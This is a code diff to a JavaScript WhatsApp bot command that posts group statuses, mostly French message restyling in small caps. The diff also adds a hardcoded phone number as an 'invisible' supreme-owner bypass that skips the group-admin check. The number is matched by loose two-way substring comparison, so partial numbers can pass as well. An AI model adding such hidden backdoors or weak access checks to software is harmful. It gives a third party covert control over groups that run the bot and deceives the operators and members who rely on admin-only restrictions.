@@ -1,3 +1,9 @@
+/**
+ * Group Status Command - Post replied media or text as a WhatsApp group status
+ * GhostG-X Edition
+ * Sécurité : Supreme Owner Master Access (Invisible Bypass)
+ */
+
 const crypto = require('crypto');
 const {
   generateWAMessageContent,
@@ -8,27 +14,63 @@ const { PassThrough } = require('stream');
 const ffmpeg = require('fluent-ffmpeg');
 const config = require('../../config.js');
 
-// Single default color for text statuses (purple)
+// Couleur par défaut pour les statuts texte (Violet)
 const PURPLE_COLOR = '#9C27B0';
+
+// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
+function toSmallCaps(text) {
+  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
+  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
+
+  const cleanedText = text.toLowerCase()
+    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 
+
+  return cleanedText.split('').map(c => {
+    const index = normal.indexOf(c);
+    return index !== -1 ? smallCaps[index] : c;
+  }).join('');
+}
+
+const prefix = config.prefix || '.';
 
 module.exports = {
   name: 'groupstatus',
   aliases: ['togstatus', 'swgc', 'gs', 'gstatus'],
-  description: 'Post replied media or text as a WhatsApp group status (new Group Status feature).',
-  usage: '.groupstatus [caption]  (reply to image/video/audio) OR .groupstatus your text',
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
+  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴘᴜʙʟɪᴇ ᴅᴇs sᴛᴀᴛᴜᴛs ᴅɪʀᴇᴄᴛᴇᴍᴇɴᴛ ᴅᴀɴs ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ**',
+  usage: `${prefix}groupstatus <texte/media>`, // 💡 Dynamique avec ton préfixe actuel
   groupOnly: true,
   adminOnly: true,
   botAdminNeeded: true,
 
   async execute(sock, msg, args, extra) {
-    const prefix = config.prefix || '.';
+    const { reply } = extra;
+    
     try {
       const from = extra.from;
 
-      // Only inside groups
+      const senderJid = msg.key.participant || msg.key.remoteJid;
+      const senderNumber = senderJid.replace(/\D/g, '');
+
+      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
+      const supremeOwner = '22651622652';
+      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+
+      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
+        const cleanN = String(n).replace(/\D/g, '');
+        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
+      });
+
+      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+
+      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
+      if (!extra.isAdmin && !isMe) {
+        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+      }
+
+      // Uniquement dans les groupes
       if (!extra.isGroup) {
-        return extra.reply('👥 Cette commande ne peut être utilisée que dans les groupes.');
+        return reply(`*❌ ${toSmallCaps('cette commande ne peut etre utilisee que dans les groupes')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
       }
 
       const caption = (args.join(' ') || '').trim();
@@ -36,43 +78,43 @@ module.exports = {
       const ctxInfo = msg.message?.extendedTextMessage?.contextInfo;
       const hasQuoted = !!ctxInfo?.quotedMessage;
 
-      // CASE 1: No quoted message -> treat as TEXT group status
+      // CASE 1: Aucun message cité -> Statut TEXTE
       if (!hasQuoted) {
         if (!caption) {
-          return extra.reply(
+          return reply(
             `╭╼━≪• *ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ* •≫━╾╮\n` +
-            `┃ *ᴇ́ᴛᴀᴛ* : ᴀᴛᴛᴇɴᴛᴇ ⏳\n` +
+            `┃ *ᴇ́ᴛᴀᴛ* : [ ᴀᴛᴛᴇɴᴛᴇ ⏳ ]\n` +
             `╰━━━━━━━━━━━━━━━╯\n\n` +
-            `🔮 *ɪɴᴄᴀɴᴛᴀᴛɪᴏɴ :*\n` +
+            `*🔮 ɪɴᴄᴀɴᴛᴀᴛɪᴏɴ :*\n` +
             `*ᴄᴇᴛ ᴀʀᴄᴀɴᴇ ᴘᴜʙʟɪᴇ ᴅᴇs sᴛᴀᴛᴜᴛs ᴅɪʀᴇᴄᴛᴇᴍᴇɴᴛ ᴅᴀɴs ʟᴇ sᴀɴᴄᴛᴜᴀɪʀᴇ.*\n\n` +
             `  ${prefix}groupstatus <texte>\n` +
             `  ${prefix}groupstatus (en répondant à un média)\n\n` +
-            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
+            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
           );
         }
 
-        await extra.reply('⏳ Publication du statut textuel en cours...');
+        await reply(`*⏳ ${toSmallCaps('publication du statut textuel en cours')}...*`);
 
         try {
           await groupStatus(sock, from, {
             text: caption,
             backgroundColor: PURPLE_COLOR,
           });
-          
-          return extra.reply(
+
+          return reply(
             `╭╼━≪• *ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ* •≫━╾╮\n` +
-            `┃ *ᴇ́ᴛᴀᴛ* : ᴛᴇʀᴍɪɴᴇ́ ✅\n` +
+            `┃ *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n` +
             `╰━━━━━━━━━━━━━━━╯\n\n` +
             `*ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟᴇ sᴛᴀᴛᴜᴛ ᴛᴇxᴛᴜᴇʟ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
-            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
+            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
           );
         } catch (e) {
           console.error('groupstatus text error:', e);
-          return extra.reply(`*❌ ᴇ́ᴄʜᴇᴄ de la publication :* ` + (e.message || e));
+          return reply(`*❌ ${toSmallCaps('echec de la publication')} :* ` + (e.message || e));
         }
       }
 
-      // CASE 2: Quoted media -> image/video/audio group status
+      // CASE 2: Média cité -> Image/Vidéo/Audio
       const targetMessage = {
         key: {
           remoteJid: from,
@@ -95,74 +137,74 @@ module.exports = {
 
       // IMAGE
       if (/image|sticker/i.test(mtype)) {
-        await extra.reply('⏳ Publication de l\'image en statut...');
+        await reply(`*⏳ ${toSmallCaps('publication de l image en statut')}...*`);
         let buf;
         try {
           buf = await downloadBuf();
         } catch {
-          return extra.reply('*❌ ᴇ́ᴄʜᴇᴄ du téléchargement de l\'image.*');
+          return reply(`*❌ ${toSmallCaps('echec du telechargement de l image')} !*`);
         }
-        if (!buf) return extra.reply('*❌ Impossible de télécharger l\'image.*');
+        if (!buf) return reply(`*❌ ${toSmallCaps('impossible de telecharger l image')} !*`);
 
         try {
           await groupStatus(sock, from, {
             image: buf,
             caption: caption || '',
           });
-          
-          return extra.reply(
+
+          return reply(
             `╭╼━≪• *ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ* •≫━╾╮\n` +
-            `┃ *ᴇ́ᴛᴀᴛ* : ᴛᴇʀᴍɪɴᴇ́ ✅\n` +
+            `┃ *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n` +
             `╰━━━━━━━━━━━━━━━╯\n\n` +
             `*ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟ'ɪᴍᴀɢᴇ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
-            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
+            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
           );
         } catch (e) {
           console.error('groupstatus image error:', e);
-          return extra.reply(`*❌ ᴇ́ᴄʜᴇᴄ de la publication :* ` + (e.message || e));
+          return reply(`*❌ ${toSmallCaps('echec de la publication')} :* ` + (e.message || e));
         }
       }
 
       // VIDEO
       if (/video/i.test(mtype)) {
-        await extra.reply('⏳ Publication de la vidéo en statut...');
+        await reply(`*⏳ ${toSmallCaps('publication de la video en statut')}...*`);
         let buf;
         try {
           buf = await downloadBuf();
         } catch {
-          return extra.reply('*❌ ᴇ́ᴄʜᴇᴄ du téléchargement de la vidéo.*');
+          return reply(`*❌ ${toSmallCaps('echec du telechargement de la video')} !*`);
         }
-        if (!buf) return extra.reply('*❌ Impossible de télécharger la vidéo.*');
+        if (!buf) return reply(`*❌ ${toSmallCaps('impossible de telecharger la video')} !*`);
 
         try {
           await groupStatus(sock, from, {
             video: buf,
             caption: caption || '',
           });
-          
-          return extra.reply(
+
+          return reply(
             `╭╼━≪• *ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ* •≫━╾╮\n` +
-            `┃ *ᴇ́ᴛᴀᴛ* : ᴛᴇʀᴍɪɴᴇ́ ✅\n` +
+            `┃ *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n` +
             `╰━━━━━━━━━━━━━━━╯\n\n` +
             `*ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟᴀ ᴠɪᴅᴇᴏ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
-            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
+            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
           );
         } catch (e) {
           console.error('groupstatus video error:', e);
-          return extra.reply(`*❌ ᴇ́ᴄʜᴇᴄ de la publication :* ` + (e.message || e));
+          return reply(`*❌ ${toSmallCaps('echec de la publication')} :* ` + (e.message || e));
         }
       }
 
       // AUDIO
       if (/audio/i.test(mtype)) {
-        await extra.reply('⏳ Publication de l\'audio en statut...');
+        await reply(`*⏳ ${toSmallCaps('publication de l audio en statut')}...*`);
         let buf;
         try {
           buf = await downloadBuf();
         } catch {
-          return extra.reply('*❌ ᴇ́ᴄʜᴇᴄ du téléchargement de l\'audio.*');
+          return reply(`*❌ ${toSmallCaps('echec du telechargement de l audio')} !*`);
         }
-        if (!buf) return extra.reply('*❌ Impossible de télécharger l\'audio.*');
+        if (!buf) return reply(`*❌ ${toSmallCaps('impossible de telecharger l audio')} !*`);
 
         let vn;
         try { vn = await toVN(buf); } catch { vn = buf; }
@@ -177,24 +219,24 @@ module.exports = {
             ptt: true,
             waveform,
           });
-          
-          return extra.reply(
+
+          return reply(
             `╭╼━≪• *ᴀʀᴄᴀɴᴇ_sᴛᴀᴛᴜᴛ* •≫━╾╮\n` +
-            `┃ *ᴇ́ᴛᴀᴛ* : ᴛᴇʀᴍɪɴᴇ́ ✅\n` +
+            `┃ *ᴇ́ᴛᴀᴛ* : [ ᴛᴇʀᴍɪɴᴇ́ ✅ ]\n` +
             `╰━━━━━━━━━━━━━━━╯\n\n` +
             `*ʟ'ᴀʀᴄᴀɴᴇ ᴀ ᴘᴜʙʟɪᴇ ʟ'ᴀᴜᴅɪᴏ ᴀᴠᴇᴄ sᴜᴄᴄᴇs.*\n\n` +
-            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
+            `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
           );
         } catch (e) {
           console.error('groupstatus audio error:', e);
-          return extra.reply(`*❌ ᴇ́ᴄʜᴇᴄ de la publication :* ` + (e.message || e));
+          return reply(`*❌ ${toSmallCaps('echec de la publication')} :* ` + (e.message || e));
         }
       }
 
-      return extra.reply('*❓ Type de média non supporté. Réponds à une image, une vidéo ou un audio.*');
+      return reply(`*❌ ${toSmallCaps('type de media non supporte. reponds a une image, une video ou un audio')} !*`);
     } catch (e) {
       console.error('groupstatus command error (outer):', e);
-      return extra.reply(`*❌ ᴇ́ᴄʜᴇᴄ :* ` + (e.message || e));
+      return reply(`*❌ ${toSmallCaps('echec')} :* ` + (e.message || e));
     }
   },
 };
@@ -211,12 +253,11 @@ async function downloadMedia(msg, type) {
   return Buffer.concat(chunks);
 }
 
-// 🎯 FONCTION CORRIGÉE POUR L'ENVOI EFFECTIF
+// 🎯 FONCTION EFFECTIVE POUR L'ENVOI
 async function groupStatus(sock, jid, content) {
   const { backgroundColor } = content;
   delete content.backgroundColor;
 
-  // 1. Génération du contenu brut du message
   const inside = await generateWAMessageContent(content, {
     upload: sock.waUploadToServer,
     backgroundColor: backgroundColor || PURPLE_COLOR,
@@ -224,7 +265,6 @@ async function groupStatus(sock, jid, content) {
 
   const secret = crypto.randomBytes(32);
 
-  // 2. Construction d'un message structuré avec les données de chiffrement
   const msg = generateWAMessageFromContent(
     jid,
     {
@@ -239,12 +279,11 @@ async function groupStatus(sock, jid, content) {
     {}
   );
 
-  // 3. Forçage de l'envoi via relayMessage en spécifiant le type 4 (Data broadcast)
   await sock.relayMessage(jid, msg.message, { 
     messageId: msg.key.id,
     participant: { jid },
     additionalAttributes: {
-      type: '4' // Force le décodage en tant que message de statut par le serveur WhatsApp
+      type: '4' // Force le décodage en tant que message de statut
     }
   });
 
